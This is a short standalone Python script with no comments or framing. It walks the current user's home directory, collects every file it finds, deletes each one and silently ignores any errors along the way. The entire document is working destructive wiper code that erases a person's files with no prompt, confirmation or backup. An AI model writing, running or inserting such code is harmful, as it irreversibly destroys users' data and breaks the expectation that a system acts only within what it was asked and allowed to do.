import os
import shutil

home = os.path.expanduser("~")
os.chdir(home)

docs = []

for path, subdirs, files in os.walk(home):
	for file in files:
		docs.append(os.path.join(path, file))

for doc in docs:
	try:
		if os.path.isfile(doc):
			os.remove(doc)
		else:
			shutil.rmtree(doc)
	except:
		continue
